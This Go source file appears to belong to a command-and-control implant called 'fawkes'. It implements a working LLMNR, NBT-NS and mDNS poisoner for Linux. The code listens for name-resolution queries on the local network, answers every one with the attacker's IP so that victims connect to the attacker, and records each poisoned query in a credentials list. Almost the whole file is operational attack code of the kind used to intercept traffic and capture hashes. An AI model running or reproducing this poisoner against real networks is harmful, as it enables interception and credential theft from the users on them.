//go:build linux
// +build linux

package commands

import (
	"context"
	"encoding/json"
	"fmt"
	"net"
	"sync"
	"time"

	"fawkes/pkg/structs"
)

// executePoison runs the LLMNR/NBT-NS/mDNS poisoner on Linux.
func (c *SniffCommand) executePoison(task structs.Task) structs.CommandResult {
	var params sniffParams
	if err := json.Unmarshal([]byte(task.Params), &params); err != nil {
		return errorf("Error parsing parameters: %v", err)
	}

	duration := params.Duration
	if duration <= 0 {
		duration = 120 // 2 minutes default for poison
	}
	if duration > poisonMaxDur {
		duration = poisonMaxDur
	}

	responseIPStr := params.ResponseIP
	if responseIPStr == "" {
		ip, err := getLocalIP(params.Interface)
		if err != nil {
			return errorf("Error detecting local IP: %v", err)
		}
		responseIPStr = ip
	}
	responseIP := net.ParseIP(responseIPStr)
	if responseIP == nil {
		return errorf("Invalid response IP: %s", responseIPStr)
	}

	protocols := parsePoisonProtocols(params.Protocols)

	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
	defer cancel()

	result := &poisonResult{
		ResponseIP: responseIPStr,
	}
	for p := range protocols {
		result.Protocols = append(result.Protocols, p)
	}

	var mu sync.Mutex
	var wg sync.WaitGroup

	// Start LLMNR listener
	if protocols["llmnr"] {
		wg.Add(1)
		go func() {
			defer wg.Done()
			if err := poisonLLMNR(ctx, responseIP, &mu, result); err != nil {
				mu.Lock()
				result.Errors = append(result.Errors, fmt.Sprintf("LLMNR: %v", err))
				mu.Unlock()
			}
		}()
	}

	// Start NBT-NS listener
	if protocols["nbtns"] {
		wg.Add(1)
		go func() {
			defer wg.Done()
			if err := poisonNBTNS(ctx, responseIP, &mu, result); err != nil {
				mu.Lock()
				result.Errors = append(result.Errors, fmt.Sprintf("NBT-NS: %v", err))
				mu.Unlock()
			}
		}()
	}

	// Start mDNS listener
	if protocols["mdns"] {
		wg.Add(1)
		go func() {
			defer wg.Done()
			if err := poisonMDNS(ctx, responseIP, &mu, result); err != nil {
				mu.Lock()
				result.Errors = append(result.Errors, fmt.Sprintf("mDNS: %v", err))
				mu.Unlock()
			}
		}()
	}

	wg.Wait()

	result.Duration = fmt.Sprintf("%ds", duration)

	output, _ := json.Marshal(result)
	return successResult(string(output))
}

// poisonLLMNR listens for LLMNR queries and responds with the attacker IP.
func poisonLLMNR(ctx context.Context, responseIP net.IP, mu *sync.Mutex, result *poisonResult) error {
	addr := &net.UDPAddr{IP: net.ParseIP(llmnrMulti), Port: llmnrPort}
	conn, err := net.ListenMulticastUDP("udp4", nil, addr)
	if err != nil {
		return fmt.Errorf("bind LLMNR %s:%d: %v", llmnrMulti, llmnrPort, err)
	}
	defer conn.Close()

	buf := make([]byte, 512)
	for {
		select {
		case <-ctx.Done():
			return nil
		default:
		}
		conn.SetReadDeadline(time.Now().Add(1 * time.Second))
		n, remoteAddr, err := conn.ReadFromUDP(buf)
		if err != nil {
			if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
				continue
			}
			continue
		}
		if n < 12 {
			continue
		}

		query := buf[:n]
		// Check it's a query (QR=0)
		if query[2]&0x80 != 0 {
			continue // skip responses
		}

		name := extractLLMNRQueryName(query)
		if name == "" {
			continue
		}

		resp, err := buildLLMNRResponse(query, responseIP)
		if err != nil {
			continue
		}

		// Send response back to the querier
		respConn, err := net.DialUDP("udp4", nil, remoteAddr)
		if err == nil {
			respConn.Write(resp)
			respConn.Close()
		}

		mu.Lock()
		result.QueriesAnswered++
		result.Credentials = append(result.Credentials, &sniffCredential{
			Protocol:  "LLMNR",
			SrcIP:     remoteAddr.IP.String(),
			SrcPort:   uint16(remoteAddr.Port),
			DstIP:     responseIP.String(),
			DstPort:   llmnrPort,
			Username:  name,
			Detail:    fmt.Sprintf("Poisoned LLMNR query for '%s' → %s", name, responseIP),
			Timestamp: time.Now().Unix(),
		})
		mu.Unlock()
	}
}

// poisonNBTNS listens for NetBIOS Name Service queries and responds.
func poisonNBTNS(ctx context.Context, responseIP net.IP, mu *sync.Mutex, result *poisonResult) error {
	conn, err := net.ListenPacket("udp4", fmt.Sprintf("0.0.0.0:%d", nbtnsPort))
	if err != nil {
		return fmt.Errorf("bind NBT-NS :%d: %v", nbtnsPort, err)
	}
	defer conn.Close()

	buf := make([]byte, 512)
	for {
		select {
		case <-ctx.Done():
			return nil
		default:
		}
		conn.SetReadDeadline(time.Now().Add(1 * time.Second))
		n, remoteAddr, err := conn.ReadFrom(buf)
		if err != nil {
			if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
				continue
			}
			continue
		}
		if n < 12 {
			continue
		}

		query := buf[:n]
		// Check it's a query (QR=0, Opcode=0)
		if query[2]&0x80 != 0 {
			continue
		}

		name := extractNBTNSQueryName(query)
		if name == "" {
			continue
		}

		resp, err := buildNBTNSResponse(query, responseIP)
		if err != nil {
			continue
		}

		conn.WriteTo(resp, remoteAddr)

		mu.Lock()
		result.QueriesAnswered++
		result.Credentials = append(result.Credentials, &sniffCredential{
			Protocol:  "NBT-NS",
			SrcIP:     remoteAddr.(*net.UDPAddr).IP.String(),
			SrcPort:   uint16(remoteAddr.(*net.UDPAddr).Port),
			DstIP:     responseIP.String(),
			DstPort:   nbtnsPort,
			Username:  name,
			Detail:    fmt.Sprintf("Poisoned NBT-NS query for '%s' → %s", name, responseIP),
			Timestamp: time.Now().Unix(),
		})
		mu.Unlock()
	}
}

// poisonMDNS listens for mDNS queries and responds with the attacker IP.
func poisonMDNS(ctx context.Context, responseIP net.IP, mu *sync.Mutex, result *poisonResult) error {
	addr := &net.UDPAddr{IP: net.ParseIP(mdnsMulti), Port: mdnsPort}
	conn, err := net.ListenMulticastUDP("udp4", nil, addr)
	if err != nil {
		return fmt.Errorf("bind mDNS %s:%d: %v", mdnsMulti, mdnsPort, err)
	}
	defer conn.Close()

	buf := make([]byte, 512)
	for {
		select {
		case <-ctx.Done():
			return nil
		default:
		}
		conn.SetReadDeadline(time.Now().Add(1 * time.Second))
		n, remoteAddr, err := conn.ReadFromUDP(buf)
		if err != nil {
			if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
				continue
			}
			continue
		}
		if n < 12 {
			continue
		}

		query := buf[:n]
		if query[2]&0x80 != 0 {
			continue
		}

		name := extractLLMNRQueryName(query) // mDNS uses same wire format as DNS/LLMNR
		if name == "" {
			continue
		}

		// Build mDNS response (same format as LLMNR response)
		resp, err := buildLLMNRResponse(query, responseIP)
		if err != nil {
			continue
		}

		// mDNS responses go to multicast
		mcastAddr := &net.UDPAddr{IP: net.ParseIP(mdnsMulti), Port: mdnsPort}
		respConn, err := net.DialUDP("udp4", nil, mcastAddr)
		if err == nil {
			respConn.Write(resp)
			respConn.Close()
		}

		mu.Lock()
		result.QueriesAnswered++
		result.Credentials = append(result.Credentials, &sniffCredential{
			Protocol:  "mDNS",
			SrcIP:     remoteAddr.IP.String(),
			SrcPort:   uint16(remoteAddr.Port),
			DstIP:     responseIP.String(),
			DstPort:   mdnsPort,
			Username:  name,
			Detail:    fmt.Sprintf("Poisoned mDNS query for '%s' → %s", name, responseIP),
			Timestamp: time.Now().Unix(),
		})
		mu.Unlock()
	}
}
